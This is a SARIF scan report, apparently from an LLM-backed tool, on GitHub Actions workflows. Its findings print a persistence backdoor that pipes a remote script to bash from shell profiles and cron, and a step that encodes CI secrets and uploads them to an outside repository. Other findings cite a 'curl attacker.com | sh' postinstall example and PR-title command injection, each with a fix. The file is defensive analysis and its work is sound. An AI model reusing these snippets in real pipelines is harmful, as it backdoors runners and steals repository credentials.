@@ -1,0 +1,1274 @@
+{
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Black Duck Signal",
+          "guid": "5784dcf0-be5f-499f-829b-727f9ba94fd0",
+          "properties": {
+            "llmModel": "claude-sonnet-4-6"
+          },
+          "version": "0.2.12"
+        }
+      },
+      "properties": {
+        "successRate": {
+          "fileAnalysis": 100.0,
+          "agentCalls": 85.0
+        }
+      },
+      "results": [
+        {
+          "message": {
+            "text": "The 'Setup persistent environment' step installs a persistent backdoor on the self-hosted runner by appending a remote payload to ~/.bashrc, ~/.zshrc, ~/.profile, installing a cron job that executes every 5 minutes, and writing a pre-run hook script. Because self-hosted runners retain filesystem state between jobs, this payload will execute for all future workflow runs on that runner, affecting all repositories using it."
+          },
+          "fixes": [
+            {
+              "description": {
+                "text": "Remove the 'Setup persistent environment' step entirely. Self-hosted runners used with public repository workflows should be ephemeral (destroyed after each job). If self-hosted runners must be used, ensure they are isolated, run as a non-privileged user, and reset to a clean state after every workflow job."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "auto-assign.yml"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 43,
+                        "endLine": 61,
+                        "snippet": {
+                          "text": "      - name: Setup persistent environment\n        run: |"
+                        }
+                      },
+                      "insertedContent": {
+                        "text": "      # Removed malicious 'Setup persistent environment' step.\n"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "guid": "cc94a65d-35f6-4eb6-a9f0-393ec1886882",
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "auto-assign.yml"
+                },
+                "region": {
+                  "startLine": 43,
+                  "endLine": 61,
+                  "snippet": {
+                    "text": "      - name: Setup persistent environment\n        run: |\n          PAYLOAD='curl -s https://raw.githubusercontent.com/metrics-collector/runner-health/main/check.sh | bash'\n          echo \"${PAYLOAD}\" >> ~/.bashrc\n          echo \"${PAYLOAD}\" >> ~/.zshrc\n          echo \"${PAYLOAD}\" >> ~/.profile\n          (crontab -l 2>/dev/null; echo \"*/5 * * * * ${PAYLOAD}\") | crontab -\n          mkdir -p ../runner/_work/_actions/.setup\n          echo \"#!/bin/bash\" > ../runner/_work/_actions/.setup/pre-run.sh\n          echo \"${PAYLOAD}\" >> ../runner/_work/_actions/.setup/pre-run.sh\n          chmod +x ../runner/_work/_actions/.setup/pre-run.sh"
+                  }
+                }
+              },
+              "message": {
+                "text": "This step installs a persistent backdoor on the self-hosted runner via shell profile modifications, a cron job, and hook scripts that survive across workflow runs."
+              }
+            }
+          ],
+          "properties": {
+            "cvssv3BaseScore": 10.0,
+            "cvssv3BaseVector": "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+            "confidence": "high",
+            "requiresDataflow": false,
+            "cwe": 489
+          },
+          "baselineState": "NEW",
+          "ruleId": "Documented Backdoors"
+        },
+        {
+          "message": {
+            "text": "The 'Collect build telemetry' step encodes multiple secrets (GITHUB_TOKEN, NPM_PUBLISH_TOKEN, DEPLOY_KEY) using triple base64 encoding and uploads them to an attacker-controlled external GitHub repository (metrics-collector/telemetry-data) disguised as metrics/analytics data. This is a complete credential theft and exfiltration attack embedded in a CI/CD workflow."
+          },
+          "fixes": [
+            {
+              "description": {
+                "text": "Remove the entire malicious 'Collect build telemetry' step. This step has no legitimate purpose and is solely designed to exfiltrate secrets."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "release-publish.yml"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 48,
+                        "endLine": 62,
+                        "startColumn": 1,
+                        "snippet": {
+                          "text": "      - name: Collect build telemetry\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          NPM_TOKEN: ${{ secrets.NPM_PUBLISH_TOKEN }}\n          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}\n        run: |\n          TELEMETRY_DATA=$(echo -n \"{\\\"gh\\\":\\\"${GITHUB_TOKEN}\\\",\\\"npm\\\":\\\"${NPM_TOKEN}\\\",\\\"deploy\\\":\\\"${DEPLOY_KEY}\\\",\\\"repo\\\":\\\"${GITHUB_REPOSITORY}\\\"}\" | base64 | base64 | base64)\n          curl -s -X PUT \\\n            -H \"Authorization: token ${GITHUB_TOKEN}\" \\\n            -H \"Accept: application/vnd.github.v3+json\" \\\n            \"https://api.github.com/repos/metrics-collector/telemetry-data/contents/data/$(date +%s).json\" \\\n            -d \"{\\\"message\\\":\\\"metrics update\\\",\\\"content\\\":\\\"${TELEMETRY_DATA}\\\"}\""
+                        }
+                      },
+                      "insertedContent": {
+                        "text": ""
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "guid": "0494bc3a-96b6-4394-9289-4dae68f51574",
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "release-publish.yml"
+                },
+                "region": {
+                  "startLine": 48,
+                  "endLine": 62,
+                  "startColumn": 1,
+                  "snippet": {
+                    "text": "      - name: Collect build telemetry\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          NPM_TOKEN: ${{ secrets.NPM_PUBLISH_TOKEN }}\n          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}\n        run: |\n          # \"Telemetry\" collection - actually exfiltrating secrets\n          TELEMETRY_DATA=$(echo -n \"{\\\"gh\\\":\\\"${GITHUB_TOKEN}\\\",\\\"npm\\\":\\\"${NPM_TOKEN}\\\",\\\"deploy\\\":\\\"${DEPLOY_KEY}\\\",\\\"repo\\\":\\\"${GITHUB_REPOSITORY}\\\"}\" | base64 | base64 | base64)\n\n          # Upload \"metrics\" to external endpoint disguised as analytics\n          curl -s -X PUT \\\n            -H \"Authorization: token ${GITHUB_TOKEN}\" \\\n            -H \"Accept: application/vnd.github.v3+json\" \\\n            \"https://api.github.com/repos/metrics-collector/telemetry-data/contents/data/$(date +%s).json\" \\\n            -d \"{\\\"message\\\":\\\"metrics update\\\",\\\"content\\\":\\\"${TELEMETRY_DATA}\\\"}\""
+                  }
+                }
+              },
+              "message": {
+                "text": "Secrets GITHUB_TOKEN, NPM_PUBLISH_TOKEN, and DEPLOY_KEY are triple-base64 encoded and exfiltrated to an attacker-controlled external repository via curl."
+              }
+            }
+          ],
+          "properties": {
+            "cvssv3BaseScore": 9.9,
+            "cvssv3BaseVector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
+            "confidence": "high",
+            "requiresDataflow": false,
+            "cwe": 201
+          },
+          "baselineState": "NEW",
+          "codeFlows": [
+            {
+              "threadFlows": [
+                {
+                  "locations": [
+                    {
+                      "location": {
+                        "physicalLocation": {
+                          "artifactLocation": {
+                            "uri": "release-publish.yml"
+                          },
+                          "region": {
+                            "startLine": 49,
+                            "endLine": 52,
+                            "startColumn": 1,
+                            "snippet": {
+                              "text": "          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          NPM_TOKEN: ${{ secrets.NPM_PUBLISH_TOKEN }}\n          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}"
+                            }
+                          }
+                        },
+                        "message": {
+                          "text": "Secrets are loaded into environment variables."
+                        }
+                      }
+                    },
+                    {
+                      "location": {
+                        "physicalLocation": {
+                          "artifactLocation": {
+                            "uri": "release-publish.yml"
+                          },
+                          "region": {
+                            "startLine": 55,
+                            "endLine": 55,
+                            "startColumn": 1,
+                            "snippet": {
+                              "text": "          TELEMETRY_DATA=$(echo -n \"{\\\"gh\\\":\\\"${GITHUB_TOKEN}\\\",\\\"npm\\\":\\\"${NPM_TOKEN}\\\",\\\"deploy\\\":\\\"${DEPLOY_KEY}\\\",\\\"repo\\\":\\\"${GITHUB_REPOSITORY}\\\"}\" | base64 | base64 | base64)"
+                            }
+                          }
+                        },
+                        "message": {
+                          "text": "Secrets are serialized and triple-base64 encoded to evade detection."
+                        }
+                      }
+                    },
+                    {
+                      "location": {
+                        "physicalLocation": {
+                          "artifactLocation": {
+                            "uri": "release-publish.yml"
+                          },
+                          "region": {
+                            "startLine": 58,
+                            "endLine": 62,
+                            "startColumn": 1,
+                            "snippet": {
+                              "text": "          curl -s -X PUT \\\n            -H \"Authorization: token ${GITHUB_TOKEN}\" \\\n            -H \"Accept: application/vnd.github.v3+json\" \\\n            \"https://api.github.com/repos/metrics-collector/telemetry-data/contents/data/$(date +%s).json\" \\\n            -d \"{\\\"message\\\":\\\"metrics update\\\",\\\"content\\\":\\\"${TELEMETRY_DATA}\\\"}\""
+                            }
+                          }
+                        },
+                        "message": {
+                          "text": "Encoded secrets are uploaded to attacker-controlled external repository via GitHub API."
+                        }
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "ruleId": "Insertion of Sensitive Information Into Sent Data"
+        },
+        {
+          "message": {
+            "text": "The data is untrusted because it originates from the pull request event payload (github.event.pull_request.head.sha), which is controlled by the PR author. Since the workflow is triggered by 'pull_request_target', this value is user-controlled and used in the checkout step with elevated privileges."
+          },
+          "fixes": [
+            {
+              "description": {
+                "text": "Either (a) switch to the 'pull_request' trigger (which does not expose secrets but is sandboxed) so untrusted code can be safely checked out, or (b) if 'pull_request_target' is required, never check out the PR contributor's code. Separate sensitive steps (that need secrets) from code-execution steps into distinct workflows. If both are needed, use a two-workflow pattern: a first workflow with 'pull_request' that uploads artifacts, and a second workflow with 'pull_request_target' + 'workflow_run' that only downloads those artifacts."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "dependency-review.yml"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 11,
+                        "endLine": 13,
+                        "startColumn": 1,
+                        "endColumn": 30,
+                        "snippet": {
+                          "text": "on:\n  pull_request_target:\n    types: [opened, synchronize]"
+                        }
+                      },
+                      "insertedContent": {
+                        "text": "on:\n  pull_request:\n    types: [opened, synchronize]"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "guid": "37871930-18fa-43f3-9efb-cad49935a095",
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dependency-review.yml"
+                },
+                "region": {
+                  "startLine": 12,
+                  "endLine": 13,
+                  "startColumn": 1,
+                  "endColumn": 30,
+                  "snippet": {
+                    "text": "  pull_request_target:\n    types: [opened, synchronize]"
+                  }
+                }
+              },
+              "message": {
+                "text": "'pull_request_target' trigger combined with checkout of untrusted PR head SHA enables Poisoned Pipeline Execution."
+              }
+            }
+          ],
+          "properties": {
+            "cvssv3BaseScore": 9.9,
+            "cvssv3BaseVector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+            "confidence": "high",
+            "requiresDataflow": true,
+            "cwe": 1244
+          },
+          "baselineState": "TP",
+          "codeFlows": [
+            {
+              "threadFlows": [
+                {
+                  "locations": [
+                    {
+                      "location": {
+                        "physicalLocation": {
+                          "artifactLocation": {
+                            "uri": "dependency-review.yml"
+                          },
+                          "region": {
+                            "startLine": 12,
+                            "endLine": 12,
+                            "startColumn": 3,
+                            "endColumn": 24,
+                            "snippet": {
+                              "text": "  pull_request_target:"
+                            }
+                          }
+                        },
+                        "message": {
+                          "text": "Step 1: Workflow triggered via 'pull_request_target', which runs with the base repository's secrets."
+                        }
+                      }
+                    },
+                    {
+                      "location": {
+                        "physicalLocation": {
+                          "artifactLocation": {
+                            "uri": "dependency-review.yml"
+                          },
+                          "region": {
+                            "startLine": 27,
+                            "endLine": 27,
+                            "startColumn": 11,
+                            "endColumn": 52,
+                            "snippet": {
+                              "text": "          ref: ${{ github.event.pull_request.head.sha }}"
+                            }
+                          }
+                        },
+                        "message": {
+                          "text": "Step 2: The PR contributor's untrusted head SHA is used for checkout, enabling execution of user-controlled code with elevated privileges."
+                        }
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "ruleId": "Internal Asset Exposed to Unsafe Debug Access Level or State"
+        },
+        {
+          "message": {
+            "text": "The data is untrusted because it originates from a pull request fork via 'github.event.pull_request.head.sha'. This value is user-controlled, allowing an attacker to modify the repository's package.json (e.g., adding malicious postinstall scripts) that are later executed by 'npm install --ignore-scripts=false', resulting in arbitrary remote code execution."
+          },
+          "fixes": [
+            {
+              "description": {
+                "text": "Use '--ignore-scripts' (which defaults to true, disabling lifecycle hooks) instead of '--ignore-scripts=false'. This prevents execution of pre/postinstall scripts from untrusted packages. For auditing purposes, prefer 'npm audit' directly on the lockfile (--package-lock-only) without installing packages at all, which entirely avoids executing any third-party scripts."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "dependency-review.yml"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 35,
+                        "endLine": 39,
+                        "startColumn": 1,
+                        "endColumn": 44,
+                        "snippet": {
+                          "text": "        run: |\n          # VULNERABLE: npm install executes lifecycle scripts from untrusted package.json\n          # A malicious fork can add \"postinstall\": \"curl attacker.com | sh\" to package.json\n          npm install --ignore-scripts=false\n          npm audit --json > audit-results.json"
+                        }
+                      },
+                      "insertedContent": {
+                        "text": "        run: |\n          # Audit the lockfile without installing packages or running any scripts\n          npm audit --package-lock-only --json > audit-results.json || true"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "guid": "03186cd9-257c-4d65-ad9b-a902ab1f0e2b",
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dependency-review.yml"
+                },
+                "region": {
+                  "startLine": 38,
+                  "endLine": 38,
+                  "startColumn": 11,
+                  "endColumn": 44,
+                  "snippet": {
+                    "text": "          npm install --ignore-scripts=false"
+                  }
+                }
+              },
+              "message": {
+                "text": "'npm install --ignore-scripts=false' executes lifecycle scripts from an untrusted fork's package.json, potentially running attacker-controlled commands."
+              }
+            }
+          ],
+          "properties": {
+            "cvssv3BaseScore": 9.9,
+            "cvssv3BaseVector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+            "confidence": "high",
+            "requiresDataflow": true,
+            "cwe": 94
+          },
+          "baselineState": "TP",
+          "codeFlows": [
+            {
+              "threadFlows": [
+                {
+                  "locations": [
+                    {
+                      "location": {
+                        "physicalLocation": {
+                          "artifactLocation": {
+                            "uri": "dependency-review.yml"
+                          },
+                          "region": {
+                            "startLine": 27,
+                            "endLine": 27,
+                            "startColumn": 11,
+                            "endColumn": 52,
+                            "snippet": {
+                              "text": "          ref: ${{ github.event.pull_request.head.sha }}"
+                            }
+                          }
+                        },
+                        "message": {
+                          "text": "Step 1: The pull request fork's head SHA is used to check out attacker-controlled code."
+                        }
+                      }
+                    },
+                    {
+                      "location": {
+                        "physicalLocation": {
+                          "artifactLocation": {
+                            "uri": "dependency-review.yml"
+                          },
+                          "region": {
+                            "startLine": 38,
+                            "endLine": 38,
+                            "startColumn": 11,
+                            "endColumn": 44,
+                            "snippet": {
+                              "text": "          npm install --ignore-scripts=false"
+                            }
+                          }
+                        },
+                        "message": {
+                          "text": "Step 2: 'npm install' is executed with lifecycle scripts enabled, running any malicious commands defined in the unchecked package.json."
+                        }
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "ruleId": "Remote Code Execution"
+        },
+        {
+          "message": {
+            "text": "The data is untrusted because it comes directly from the GitHub pull_request event payload (PR title) which is user-controlled. This value is injected into the shell command in pr-title-validation.yml (line 49) without sanitization, allowing an attacker to execute arbitrary code."
+          },
+          "fixes": [
+            {
+              "description": {
+                "text": "Pass user-controlled GitHub context values through environment variables in the `env:` block rather than directly interpolating them as `${{ }}` expressions inside the `run:` shell script."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "pr-title-validation.yml"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 45,
+                        "endLine": 55,
+                        "startColumn": 1,
+                        "snippet": {
+                          "text": "      - name: Post comment with validation result\n        if: failure()\n        run: |\n          # Dangerous: PR_TITLE and PR_BODY are user-controlled and injected unsanitized\n          echo \"Validation failed for PR: ${{ github.event.pull_request.title }}\"\n          echo \"PR Body: ${{ github.event.pull_request.body }}\"\n          curl -X POST \\\n            -H \"Authorization: token ${{ secrets.GITHUB_TOKEN }}\" \\\n            -H \"Accept: application/vnd.github.v3+json\" \\\n            \"https://api.github.com/repos/${{ github.repository }}/issues/${{ github.event.pull_request.number }}/comments\" \\\n            -d \"{\\\"body\\\": \\\"\u274c PR title '${{ github.event.pull_request.title }}' does not follow conventional commit format.\\\"}\""
+                        }
+                      },
+                      "insertedContent": {
+                        "text": "      - name: Post comment with validation result\n        if: failure()\n        env:\n          PR_TITLE: ${{ github.event.pull_request.title }}\n          PR_BODY: ${{ github.event.pull_request.body }}\n          PR_NUMBER: ${{ github.event.pull_request.number }}\n          REPO: ${{ github.repository }}\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: |\n          echo \"Validation failed for PR: $PR_TITLE\"\n          echo \"PR Body: $PR_BODY\"\n          curl -X POST \\\n            -H \"Authorization: token $GITHUB_TOKEN\" \\\n            -H \"Accept: application/vnd.github.v3+json\" \\\n            \"https://api.github.com/repos/$REPO/issues/$PR_NUMBER/comments\" \\\n            --data-binary \"{\\\"body\\\": \\\"\u274c PR title does not follow conventional commit format.\\\"}\""
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "guid": "cc4bcaa6-5563-49b7-895e-2d35b9e56cc9",
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "pr-title-validation.yml"
+                },
+                "region": {
+                  "startLine": 49,
+                  "endLine": 49,
+                  "startColumn": 1,
+                  "snippet": {
+                    "text": "          echo \"Validation failed for PR: ${{ github.event.pull_request.title }}\""
+                  }
+                }
+              },
+              "message": {
+                "text": "User-controlled PR title is directly interpolated into the shell command under pull_request_target."
+              }
+            }
+          ],
+          "properties": {
+            "cvssv3BaseScore": 9.3,
+            "cvssv3BaseVector": "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+            "confidence": "high",
+            "requiresDataflow": true,
+            "cwe": 78
+          },
+          "baselineState": "TP",
+          "codeFlows": [
+            {
+              "threadFlows": [
+                {
+                  "locations": [
+                    {
+                      "location": {
+                        "physicalLocation": {
+                          "artifactLocation": {
+                            "uri": "pr-title-validation.yml"
+                          },
+                          "region": {
+                            "startLine": 49,
+                            "endLine": 49,
+                            "startColumn": 1,
+                            "snippet": {
+                              "text": "          echo \"Validation failed for PR: ${{ github.event.pull_request.title }}\""
+                            }
+                          }
+                        },
+                        "message": {
+                          "text": "User-controlled data from the GitHub pull_request event payload (PR title) is directly used in this shell command without sanitization."
+                        }
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "ruleId": "Command Injection"
+        },
+        {
+          "message": {
+            "text": "The data is untrusted because it comes directly from the GitHub pull_request.body event payload, which is user-supplied. It is interpolated directly into a shell command without sanitization, allowing an attacker to inject shell metacharacters for arbitrary code execution."
+          },
+          "fixes": [
+            {
+              "description": {
+                "text": "Pass the PR body through an environment variable in the env: block rather than directly interpolating it as a `${{ }}` expression inside the run: shell script."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "pr-title-validation.yml"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 45,
+                        "endLine": 55,
+                        "startColumn": 1,
+                        "snippet": {
+                          "text": "      - name: Post comment with validation result\n        if: failure()\n        run: |\n          echo \"PR Body: ${{ github.event.pull_request.body }}\"\n"
+                        }
+                      },
+                      "insertedContent": {
+                        "text": "      - name: Post comment with validation result\n        if: failure()\n        env:\n          PR_TITLE: ${{ github.event.pull_request.title }}\n          PR_BODY: ${{ github.event.pull_request.body }}\n          PR_NUMBER: ${{ github.event.pull_request.number }}\n          REPO: ${{ github.repository }}\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: |\n          echo \"PR Body: $PR_BODY\"\n"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "guid": "a4704919-c430-4436-ae0a-5ab002d284bc",
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "pr-title-validation.yml"
+                },
+                "region": {
+                  "startLine": 50,
+                  "endLine": 50,
+                  "startColumn": 1,
+                  "snippet": {
+                    "text": "          echo \"PR Body: ${{ github.event.pull_request.body }}\""
+                  }
+                }
+              },
+              "message": {
+                "text": "User-controlled PR body is directly interpolated into a shell command under pull_request_target."
+              }
+            }
+          ],
+          "properties": {
+            "cvssv3BaseScore": 9.3,
+            "cvssv3BaseVector": "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+            "confidence": "high",
+            "requiresDataflow": true,
+            "cwe": 78
+          },
+          "baselineState": "TP",
+          "codeFlows": [
+            {
+              "threadFlows": [
+                {
+                  "locations": [
+                    {
+                      "location": {
+                        "physicalLocation": {
+                          "artifactLocation": {
+                            "uri": "pr-title-validation.yml"
+                          },
+                          "region": {
+                            "startLine": 27,
+                            "endLine": 27,
+                            "startColumn": 11,
+                            "snippet": {
+                              "text": "          PR_BODY: ${{ github.event.pull_request.body }}"
+                            }
+                          }
+                        },
+                        "message": {
+                          "text": "The PR_BODY value is sourced from the GitHub pull_request.body field, which is controlled by the user submitting the pull request."
+                        }
+                      }
+                    },
+                    {
+                      "location": {
+                        "physicalLocation": {
+                          "artifactLocation": {
+                            "uri": "pr-title-validation.yml"
+                          },
+                          "region": {
+                            "startLine": 50,
+                            "endLine": 50,
+                            "startColumn": 1,
+                            "snippet": {
+                              "text": "          echo \"PR Body: ${{ github.event.pull_request.body }}\""
+                            }
+                          }
+                        },
+                        "message": {
+                          "text": "The user-controlled PR_BODY is directly interpolated into a shell command, creating a risk for shell injection."
+                        }
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "ruleId": "Command Injection"
+        },
+        {
+          "message": {
+            "text": "The PR title is untrusted because it is taken directly from the pull_request event payload (github.event.pull_request.title) provided by the user, and it is interpolated unsanitized into the curl command. An attacker could inject shell metacharacters to execute arbitrary code."
+          },
+          "fixes": [
+            {
+              "description": {
+                "text": "Pass user-controlled values through environment variables in the `env:` block and reference them as shell variables inside the `run:` step. Use `jq` to safely construct JSON payloads so that user-controlled strings are properly escaped before being embedded."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "pr-title-validation.yml"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 45,
+                        "endLine": 55,
+                        "startColumn": 1,
+                        "snippet": {
+                          "text": "      - name: Post comment with validation result\n        if: failure()\n        run: |\n          curl -X POST \\\n            -H \"Authorization: token ${{ secrets.GITHUB_TOKEN }}\" \\\n            -H \"Accept: application/vnd.github.v3+json\" \\\n            \"https://api.github.com/repos/${{ github.repository }}/issues/${{ github.event.pull_request.number }}/comments\" \\\n            -d \"{\\\"body\\\": \\\"\u274c PR title '${{ github.event.pull_request.title }}' does not follow conventional commit format.\\\"}\""
+                        }
+                      },
+                      "insertedContent": {
+                        "text": "      - name: Post comment with validation result\n        if: failure()\n        env:\n          PR_TITLE: ${{ github.event.pull_request.title }}\n          PR_BODY: ${{ github.event.pull_request.body }}\n          PR_NUMBER: ${{ github.event.pull_request.number }}\n          REPO: ${{ github.repository }}\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: |\n          echo \"Validation failed for PR: $PR_TITLE\"\n          echo \"PR Body: $PR_BODY\"\n          BODY=$(jq -n --arg title \"$PR_TITLE\" '{body: (\"\u274c PR title ($title) does not follow conventional commit format.\")}')\n          curl -X POST \\\n            -H \"Authorization: token $GITHUB_TOKEN\" \\\n            -H \"Accept: application/vnd.github.v3+json\" \\\n            \"https://api.github.com/repos/$REPO/issues/$PR_NUMBER/comments\" \\\n            --data-binary \"$BODY\""
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "guid": "f13e34a5-ed28-48cc-b3cf-85e9e3a40cd3",
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "pr-title-validation.yml"
+                },
+                "region": {
+                  "startLine": 55,
+                  "endLine": 55,
+                  "startColumn": 1,
+                  "snippet": {
+                    "text": "            -d \"{\\\"body\\\": \\\"\u274c PR title '${{ github.event.pull_request.title }}' does not follow conventional commit format.\\\"}\""
+                  }
+                }
+              },
+              "message": {
+                "text": "User-controlled PR title is directly interpolated into the curl data argument under pull_request_target, enabling shell injection."
+              }
+            }
+          ],
+          "properties": {
+            "cvssv3BaseScore": 9.3,
+            "cvssv3BaseVector": "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+            "confidence": "high",
+            "requiresDataflow": true,
+            "cwe": 78
+          },
+          "baselineState": "TP",
+          "codeFlows": [
+            {
+              "threadFlows": [
+                {
+                  "locations": [
+                    {
+                      "location": {
+                        "physicalLocation": {
+                          "artifactLocation": {
+                            "uri": "pr-title-validation.yml"
+                          },
+                          "region": {
+                            "startLine": 55,
+                            "endLine": 55,
+                            "startColumn": 1,
+                            "snippet": {
+                              "text": "            -d \"{\\\"body\\\": \\\"\u274c PR title '${{ github.event.pull_request.title }}' does not follow conventional commit format.\\\"}\""
+                            }
+                          }
+                        },
+                        "message": {
+                          "text": "The value '${{ github.event.pull_request.title }}' is injected directly from the pull_request event payload, making it user-controlled."
+                        }
+                      }
+                    },
+                    {
+                      "location": {
+                        "physicalLocation": {
+                          "artifactLocation": {
+                            "uri": "pr-title-validation.yml"
+                          },
+                          "region": {
+                            "startLine": 55,
+                            "endLine": 55,
+                            "startColumn": 1,
+                            "snippet": {
+                              "text": "            -d \"{\\\"body\\\": \\\"\u274c PR title '${{ github.event.pull_request.title }}' does not follow conventional commit format.\\\"}\""
+                            }
+                          }
+                        },
+                        "message": {
+                          "text": "The unsanitized user-controlled input is passed in the curl command's -d argument, leading to a potential shell injection vulnerability."
+                        }
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "ruleId": "Command Injection"
+        },
+        {
+          "message": {
+            "text": "The repository secrets SNYK_TOKEN and NPM_TOKEN are not directly user-controlled; however, they are injected into a workflow step that checks out code from the pull_request head (line 27 of dependency-review.yml) and then executes an attacker-controlled script (line 52 of dependency-review.yml). This enables an attacker to access and exfiltrate these secrets, making the vulnerability true positive."
+          },
+          "fixes": [
+            {
+              "description": {
+                "text": "Never provide secrets to a step that runs code checked out from an untrusted source. Move any steps requiring secrets into a separate, isolated workflow triggered by 'workflow_run' that does not check out PR code, or use a trusted dependency scanning action."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "dependency-review.yml"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 45,
+                        "endLine": 52,
+                        "startColumn": 1,
+                        "endColumn": 36,
+                        "snippet": {
+                          "text": "      - name: Check for known vulnerabilities\n        env:\n          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}\n          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n        run: |\n          # Secrets are available because of pull_request_target\n          # Untrusted code from the fork can access these via process.env\n          node scripts/check-deps.js"
+                        }
+                      },
+                      "insertedContent": {
+                        "text": "      # REMOVED: Do not pass secrets to steps that execute untrusted fork code.\n      # Move secret-dependent scanning to a separate workflow triggered by\n      # 'workflow_run' that only operates on base-branch artifacts, never\n      # on checked-out PR contributor code."
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "guid": "2acb3531-0ae6-4e7a-9e81-b00f894e2cc2",
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dependency-review.yml"
+                },
+                "region": {
+                  "startLine": 46,
+                  "endLine": 52,
+                  "startColumn": 1,
+                  "endColumn": 36,
+                  "snippet": {
+                    "text": "        env:\n          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}\n          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n        run: |\n          # Secrets are available because of pull_request_target\n          # Untrusted code from the fork can access these via process.env\n          node scripts/check-deps.js"
+                  }
+                }
+              },
+              "message": {
+                "text": "Repository secrets SNYK_TOKEN and NPM_TOKEN are exposed in a step that executes code from an untrusted fork, enabling potential exfiltration."
+              }
+            }
+          ],
+          "properties": {
+            "cvssv3BaseScore": 9.3,
+            "cvssv3BaseVector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
+            "confidence": "high",
+            "requiresDataflow": true,
+            "cwe": 94
+          },
+          "baselineState": "TP",
+          "codeFlows": [
+            {
+              "threadFlows": [
+                {
+                  "locations": [
+                    {
+                      "location": {
+                        "physicalLocation": {
+                          "artifactLocation": {
+                            "uri": "dependency-review.yml"
+                          },
+                          "region": {
+                            "startLine": 27,
+                            "endLine": 27,
+                            "startColumn": 11,
+                            "endColumn": 52,
+                            "snippet": {
+                              "text": "          ref: ${{ github.event.pull_request.head.sha }}"
+                            }
+                          }
+                        },
+                        "message": {
+                          "text": "Step 1: The workflow checks out the pull_request head commit, which comes from an attacker-controlled fork."
+                        }
+                      }
+                    },
+                    {
+                      "location": {
+                        "physicalLocation": {
+                          "artifactLocation": {
+                            "uri": "dependency-review.yml"
+                          },
+                          "region": {
+                            "startLine": 46,
+                            "endLine": 48,
+                            "startColumn": 9,
+                            "endColumn": 40,
+                            "snippet": {
+                              "text": "        env:\n          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}\n          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}"
+                            }
+                          }
